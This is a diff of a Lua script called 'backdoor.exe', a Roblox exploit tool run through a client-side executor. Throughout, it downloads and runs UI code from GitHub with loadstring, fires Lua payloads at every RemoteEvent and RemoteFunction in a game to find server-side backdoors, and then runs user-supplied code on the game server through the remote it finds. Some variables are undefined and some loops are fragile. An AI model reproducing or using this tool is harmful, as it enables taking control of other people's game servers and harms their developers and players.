@@ -1,459 +1,97 @@
---[========================================================================[
-    backdoor.exe, the best backdoor scanner in Roblox.
-    Copyright (C) 2025 ReactorCoreDev
+local genv = getgenv()
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+if genv.backdoorexe then genv.backdoorexe.screenGui:Destroy() end
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>.
---]========================================================================]
-
-
---// TYPES \\--
---[[ export type LikelyBackdoor = RemoteEvent|RemoteFunction;
-export type MakeDummy = (LikelyBackdoor, string) -> nil;
-export type ExecuteBackdoor = (BackdoorGateway, ...any) -> any;
-
--- @BackdoorSolver
--- Solvers allow us to provide a maintanable way of
--- adding new backdoors detections and executions.
-export type BackdoorSolver = {
-    makeDummy: MakeDummy,
-    Execute: ExecuteBackdoor
-}
-
--- @BackdoorGateway
--- Once found a backdoor we instanciate a new gateway which is responsible of using the backdoor
-export type BackdoorGateway = {
-    b: LikelyBackdoor,                          -- backdoor
-    Execute: (BackdoorGateway, ...any) -> any
-};]]
-
--- // CHECK IF RUNNING \\ --
-local genv = getgenv();
-if genv.backdoorexe then
-    genv.backdoorexe.screenGui:Destroy();
-end
-
---// UI \\--
 local screenGui, uiRequire = loadstring(game:HttpGet("https://raw.githubusercontent.com/ReactorCoreDev/backdoor.exe/v8/src/ui.lua"))()
 local alertLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ReactorCoreDev/backdoor.exe/v8/src/alerts.lua"))()
 
-local ui = uiRequire(screenGui.main);
-local config = ui.config;
-local games = ui.games;
-local btns = ui.btns;
-local editor = ui.editor;
-local CurrentBackdoor = nil;
+local ui = uiRequire(screenGui.main)
+local config = ui.config
+local btns = ui.btns
+local editor = ui.editor
+local CurrentBackdoor = nil
 
--- // START SESSION \\ --
-genv.backdoorexe = {
-    screenGui = screenGui,
-    ui = ui
-};
+genv.backdoorexe = {screenGui = screenGui, ui = ui}
 
---// SERVICES \\--
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local TITLE = "backdoor.exe - v8.0.0 (Fixed)"
 
-local httpService = game:GetService("HttpService");
-local serverScript = game:GetService("ServerScriptService");
-local players = game:GetService("Players");
-local localPlayer = players.LocalPlayer;
+local ALPHABET = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','!','@','#','$','%','^','&','*','(',')','-','_','=','+','[',']','{','}','|',';',':',',','.','?','/','`','~'}
 
---// GLOBALS \\--
-local MAXTIMEOUT = 20;
-local TITLE = "backdoor.exe - v8.0.0";
-local BACKDOOR_SOLVER = {};
-local BACKDOOR_FILTER = {};
-local URSTRING_TO_BACKDOOR = {};
-local ALPHABET = {
-    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
-    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
-    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
-    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "]", "{", "}", "|", ";", ":", ",", ".", "?", "/", "`", "~"
-};
-
--- // CONSTANTS \\--
-local EXEC_DEBUG = [[
-local BEXE_stdout = {};
-local print = function(...)
-    table.insert(BEXE_stdout, {
-        value = {...}
-    });
-end;
-local warn = function(...)
-    table.insert(BEXE_stdout, {
-        warn = true,
-        value = {...}
-    });
-end;
-local int, err = pcall(function() %s end);
-local BEXE = Instance.new("BoolValue");
-BEXE.Name = "%s";
-BEXE.Value = int;
-if not int then
-    bool:SetAttribute("err", err);
-end;
-if #BEXE_stdout > 0 then
-    BEXE:SetAttribute(
-        "stdout",
-        game:GetService("HttpService"):JSONEncode(BEXE_stdout)
-    );
-end;
-BEXE.Parent = workspace;
-game:GetService("Debris"):AddItem(BEXE, 3);
-]];
--- this code execute on game server, doesn't have any role with user client
-local LOG_GAME = [[
-if BEXE_LOG == true then return; end;
-getfenv()["BEXE_LOG"] = true;
-]];
-
---// UTILS \\--
-
-local function stringSplit (inputstr, sep)
-    if sep == nil then
-        sep = "%s"
-    end
-    local t={}
-    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
-        table.insert(t, str)
-    end
-    return t
+local function GenerateRandomString(length)
+	local str = ""
+	for i = 1, length do
+		str = str .. ALPHABET[math.random(1, #ALPHABET)]
+	end
+	return str
 end
 
--- solve roblox path
-local roRoots = {
-    workspace = workspace,
-    game = game
-}
-
-local function solveRobloxPath(path)
-    local path = stringSplit(path, ".");
-    local inst = roRoots[path[1]] or game:GetService(path[1]);
-    if not inst then
-        return nil;
-    end;
-    for i = 2, #path do
-        inst = inst:FindFirstChild(path[i]);
-        if not inst then
-            return nil;
-        end;
-    end;
-    return inst;
-end;
-
--- encode backdoors table
-local function encodeBackdoors(backdoors)
-    local encoded = {};
-    for i, v in ipairs(backdoors) do
-        table.insert(encoded, v.b:GetFullName());
-    end
-    return encoded;
-end;
-
--- fire RemoteEvent/RemoteFunction with the given arguments in a new thread
 local function runRemote(r, args)
-    if r:IsA("RemoteEvent") then
-        pcall(function()
-            task.spawn(function()
-                spawn(function()
-                    r:FireServer(args);
-                end);
-            end);
-        end);
-    elseif r:IsA("RemoteFunction") then
-        pcall(function()
-            task.spawn(function()
-                spawn(function()
-                    r:InvokeServer(args);
-                end);
-            end);
-        end);
-    end;
+	if r:IsA("RemoteEvent") then
+		pcall(function() r:FireServer(args) end)
+	elseif r:IsA("RemoteFunction") then
+		pcall(function() r:InvokeServer(args) end)
+	end
 end
 
--- generate an unique random string name inside the passed parent
-local function urString(len, parent)
-    local name = "";
-    local r = Random.new();
-    while true do
-        for i = 1, len do
-            local idx = r:NextInteger(1, #ALPHABET);
-            local c = ALPHABET[idx];
-            name = name .. c;
-        end;
-        if parent == nil or parent:FindFirstChild(name) == nil then
-            break;
-        end;
-        -- rare but still possible :o
-        name = "";
-    end
-    return name;
-end;
-
-local function GenerateRandomString(Length)
-    local Alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
-
-	local String = "";
-	
-	for i = 1, Length do
-		String = String .. Alphabet[math.random(1,#Alphabet)];
+local function scanAndFireBackdoors()
+	ui.title.Text = TITLE .. " [Scanning]"
+	alertLib.Info(screenGui, TITLE, "Scan started.", 4)
+	local remotes = {}
+	for _, remote in ipairs(game:GetDescendants()) do
+		if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not remote:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
+			local code = GenerateRandomString(math.random(12,30))
+			remotes[code] = remote
+			local payload = [[
+local StringValue = Instance.new("StringValue")
+StringValue.Value = "]] .. code .. [["
+StringValue.Name = "]] .. code .. [["
+game:GetService("Debris"):AddItem(StringValue, 3)
+StringValue.Parent = game:GetService("ReplicatedStorage")
+]]
+			runRemote(remote, payload)
+			print("Fired remote: " .. remote:GetFullName())
+		end
 	end
 	
-	return String;
-end;
-
--- wrap to make a BackdoorGateway
-local function makeGateway(r, s)
-    return {
-        b = r,
-        Execute = s.Execute
-    };
-end;
-
---// SOLVERS \\--
-
--- [[COMMON BACKDOOR SOLVER]]
--- @detection by performing a remote run and instanciating a dummy instance
--- @execution_param code:string
-BACKDOOR_SOLVER[1] = {
-    makeDummy = function(r, dummyName)
-        --[[ check if loadstring is disabled | sobly not work
-        if gethiddenproperty(ServerScript, "LoadStringEnabled") == false then
-            URSTRING_TO_BACKDOOR[dummyName] = nil;
-            return;
-        end;]]
-        local src = ('local d = Instance.new("BoolValue", workspace);d.Name = "%s";game:GetService("Debris"):AddItem(d, 3);'):format(
-            dummyName
-        );
-        runRemote(r, src);
-    end,
-    Execute = function(g, code)
-        return runRemote(g.b, code);
-    end
-};
-
---// FILTERS \\--
--- I suggest registering filters in priority order, and they must be thread safe.
-
--- [[COMMON BACKDOOR FILTER]]
--- @filter ClassName check the passed instance
-BACKDOOR_FILTER[1] = function(r)
-        -- Checking the class
-    return r:IsA("RemoteEvent") or r:IsA("RemoteFunction");
-end;
-BACKDOOR_FILTER[2] = function(r)
-        -- Anti-Addonis Filter
-        return not ((r.Parent == game:GetService("ReplicatedStorage") and r:FindFirstChild("__FUNCTION")) or
-            (r.Name == "__FUNCTION" and r.Parent:IsA("RemoteEvent") and r.Parent.Parent == game:GetService("ReplicatedStorage")));
-end;
-BACKDOOR_FILTER[3] = function(r)
-    local Parent = tostring(r.Parent and r.Parent.Parent);
-    return not (Parent == "HDAdminClient")
-end;
-
---// CORE \\--
-
-local function filterRemote(r, remotes)
-    for _, filter in ipairs(BACKDOOR_FILTER) do
-        if not filter(r) then
-            return false; -- remote is not a backdoor
-        end;
-    end;
-    table.insert(remotes, r);
-    return true;
+	local BackdoorFound = false
+	
+	repeat
+		for code, remote in pairs(remotes) do
+			local foundItem = game:GetService("ReplicatedStorage"):FindFirstChild(code)
+			if foundItem and foundItem:IsA("StringValue") and foundItem.Value == code then
+				CurrentBackdoor = remote
+				warn("Remote that executed the code: " .. remote:GetFullName())
+				BackdoorFound = true
+				break
+			end
+		end
+		wait(0.1)
+	until BackdoorFound
+	ui.title.Text = TITLE .. " [Attached Backdoor]"
+	alertLib.Info(screenGui, TITLE, "Attached Backdoor: " .. CurrentBackdoor:GetFullName(), 4)
 end
 
-local function getRemotes()
-    local remotes = {};
-    for i, r in ipairs(game:GetDescendants()) do
-        filterRemote(r, remotes);
-    end;
-    -- check getnilinstances support
-    if getnilinstances == nil then
-        return remotes;
-    end
-    for i, r in ipairs(getnilinstances()) do
-        filterRemote(r, remotes);
-    end;
-    return remotes;
-end;
+local executing = false
 
-local function CheckBackdoor(Remote, BackdoorCode)
-    if game:GetService("ReplicatedStorage"):FindFirstChild(BackdoorCode) then
-        if game:GetService("ReplicatedStorage"):FindFirstChild(BackdoorCode):IsA("IntValue") then
-            if game:GetService("ReplicatedStorage"):FindFirstChild(BackdoorCode).Value == BackdoorCode then
-                return Remote;
-            end;
-        end;
-    end;
-    
-    return false;
+local function execute(code, gateway, canDebug)
+	executing = true
+	ui.title.Text = TITLE .. " [Executing]"
+	runRemote(CurrentBackdoor, code)
+	task.wait(2)
+	ui.title.Text = TITLE
+	executing = false
 end
 
--- scan all game remotes and return all backdoors found
-local function scanAndFireBackdoors()
-    local remotes = getRemotes();
-    local backdoor;
-    local code;
-    
-    -- Start scanning for remotes
-    alertLib.Info(screenGui, TITLE, 'Scan started.', 4);
-    ui.title.Text = TITLE .. " [Scanning]";
-
-    -- Loop through remotes to find possible backdoors
-    for i, r in ipairs(remotes) do
-        local Code = GenerateRandomString(math.random(15, 29));
-
-        runRemote(r, [[
-            local IntValue = Instance.new("IntValue");
-
-            IntValue.Value = "]] .. Code .. [[";
-
-            IntValue.Name = "]] .. Code .. [[";
-
-            game:GetService("Debris"):AddItem(IntValue, 2 + 1);
-
-            IntValue.Parent = game:GetService("ReplicatedStorage");
-        ]]);
-
-        repeat CheckBackdoor(r, Code) task.wait() until not CheckBackdoor(r, Code) == false;
-
-        CurrentBackdoor = r;
-        ui.title.Text = TITLE .. " [Attached Backdoor]";
-
-        alertLib.Info(screenGui, TITLE, "Attached Backdoor:", r:GetFullName(), 4);
-        
-        -- Fire the backdoor and check if it's found
-        backdoor = r;
-        break;  -- Stop once the backdoor is found
-    end
-    
-    if backdoor then
-        -- Proceed with firing the backdoor and execute code
-        alertLib.Info(screenGui, TITLE, "Firing backdoor...", 4);
-        runRemote(backdoor, "execute_code");  -- Firing the backdoor (replace 'execute_code' with actual code)
-        
-        -- Check if the backdoor is properly attached and execute code
-        local checkBackdoor = CheckBackdoor(backdoor, "check_code");  -- Replace with actual check logic
-        
-        if checkBackdoor then
-            ui.title.Text = TITLE .. " [Executing]";
-
-            -- Apply macros and execute code
-            local code = applyMacros(editor.getCode());
-            execute(code, backdoor, config.data.settings.canDebug);
-
-            alertLib.Success(screenGui, TITLE, "Backdoor executed successfully.", 4);
-        else
-            alertLib.Error(screenGui, TITLE, "Backdoor check failed.", 4);
-        end
-    else
-        alertLib.Error(screenGui, TITLE, "No backdoor found.", 4);
-    end
-end
-
-local executing = false;
-
-local function execute(code, gateway, canDebug, disableAlerts)
-    executing = true;
-    
-    ui.title.Text = TITLE .. " [Executing]";
-    
-    runRemote(CurrentBackdoor, Code);
-
-    task.wait();
-
-    ui.title.Text = TITLE .. " [Executed]";
-
-    task.wait(2);
-
-    ui.title.Text = TITLE .. " ";
-
-    executing = false;
-    
-    return
-end;
-
-
--- perform a scan and print out the time taken and the found backdoors
-local function debugScan()
-    local start = tick();
-    local backdoor = scan(nil, 2.5);
-    local endTime = tick();
-    print("Backdoors found: " .. (backdoor and 1 or 0));
-    print("Time taken: " .. (endTime - start) .. "ms");
-    return backdoor;
-end;
-
--- macros solver
-local function applyMacros(code)
-    return 
-    code:gsub(
-        "%%username%%", localPlayer.Name
-    ):gsub(
-        "%%userid%%", localPlayer.UserId
-    ):gsub(
-        "%%userping%%", localPlayer:GetNetworkPing()
-    ):gsub(
-        "%%debug%%", tostring(config.data.settings.canDebug)
-    );
-end;
-
--- retrive backdoors from config
-local function getBackdoorFromConfig()
-    if config.data.games[game.PlaceId] then
-        local gameBackdoors = config.data.games[game.PlaceId].backdoors;
-        local remotes = {};
-        -- loop saved instances
-        for i, path in next, gameBackdoors do
-            -- resolve instance path
-            local remote = solveRobloxPath(path);
-            -- store instance after filters check
-            if remote then
-                filterRemote(remote, remotes);
-            end;
-        end
-        -- scan with config remotes
-        return scan(remotes, 3);
-    end;
-    return nil;
-end;
-
--- execution level
-local backdoor;
-local firstExecution = true;
-local function resetExecutionState()
-    executing = false;
-    ui.title.Text = TITLE;
-end;
-
--- Connect the button to trigger the scanning and firing process
 btns.execBtn.MouseButton1Click:Connect(function()
-    -- Avoid multiple executions
-    if executing then
-        return;
-    end
-    executing = true;
+	if executing then return end
+	executing = true
+	scanAndFireBackdoors()
+	executing = false
+end)
 
-    -- Perform the scan and execution
-    scanAndFireBackdoors();
-
-    -- Reset execution state
-    executing = false;
-end);
-
--- set title
-ui.title.Text = TITLE;
-
-alertLib.Success(screenGui, TITLE, 'Backdoor scanner successfully loaded.');
-alertLib.Info(screenGui, TITLE, 'Home to toggle ui.', 4);
-alertLib.Info(screenGui, TITLE, 'Recontinued by ReactorCoreDev!!', 4);
+ui.title.Text = TITLE
+alertLib.Success(screenGui, TITLE, "Backdoor scanner successfully loaded.")
+alertLib.Info(screenGui, TITLE, "Home to toggle ui.", 4)
+alertLib.Info(screenGui, TITLE, "Recontinued by ReactorCoreDev!!", 4)
